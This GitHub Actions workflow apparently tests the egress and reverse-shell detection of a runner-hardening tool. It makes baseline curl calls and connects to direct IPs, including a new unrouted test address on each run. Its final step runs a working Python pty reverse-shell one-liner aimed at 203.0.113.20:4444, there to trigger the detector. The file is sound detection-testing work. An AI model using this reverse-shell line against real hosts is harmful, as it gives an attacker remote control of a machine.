name: Direct IP egress detection test

# Exercises the direct-IP:443-with-no-domain code path and interpreter reverse-shell
# detection on a GitHub-hosted runner.

on:
  push:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  direct-ip-test:
    runs-on: ubuntu-latest
    steps:
      - name: Harden the runner (Audit all outbound calls)
        uses: step-security/harden-runner@05e31511f85b41b11d1cf0ef85d0992719546e2c # v2.21.0
        with:
          egress-policy: audit

      - uses: prateek-stepsecurity/harden-runner@d867105c9eeb1add8fb44cd8574129594c68cc17 # int
        with:
          egress-policy: audit

      - uses: actions/checkout@main

      # Stable allowed traffic, to help the workflow-job accumulate baseline runs.
      - name: baseline domain calls
        if: always()
        run: |
          curl -v -4 --max-time 10 https://google.com || true
          curl -v -4 --max-time 10 https://microsoft.com || true

      # Direct IPs that should already be in the baseline after the first run, so
      # they show as accepted (not a fresh detection).
      - name: accepted direct IPs on 443 (no DNS)
        if: always()
        run: |
          curl -v --max-time 10 https://1.1.1.1:443/ -o /dev/null || true
          curl -v --max-time 10 https://9.9.9.9:443/ -o /dev/null || true

      # A NEW direct IP on 443 every run (RFC 5737 TEST-NET-3, not routed but the
      # TCP SYN is still captured by the eBPF egress probe). Once the workflow-job
      # baseline is mature this should surface at THIS step and fire a
      # New-Outbound-Network-Call detection each run, failing the Harden-Runner check.
      - name: new direct IP on 443 per run (no DNS)
        if: always()
        run: |
          OCTET=$(( (GITHUB_RUN_NUMBER % 250) + 2 ))
          IP="203.0.113.$OCTET"
          echo "Testing new direct IP: $IP"
          curl -v --max-time 8 "https://$IP:443/" -o /dev/null || true
          timeout 8 python3 -c "import socket; s=socket.socket(); s.settimeout(6); s.connect(('$IP',443)); s.close()" || true

      # Interpreter reverse shell (python pty.spawn). No listener is needed: the
      # classifier inspects the process argv, so it is detected even though the
      # connection to the (unrouted TEST-NET-3) address times out.
      - name: interpreter reverse shell (python pty)
        if: always()
        run: |
          timeout 8 python3 -c 'import socket,os,pty;s=socket.socket();s.settimeout(5);s.connect(("203.0.113.20",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' || true
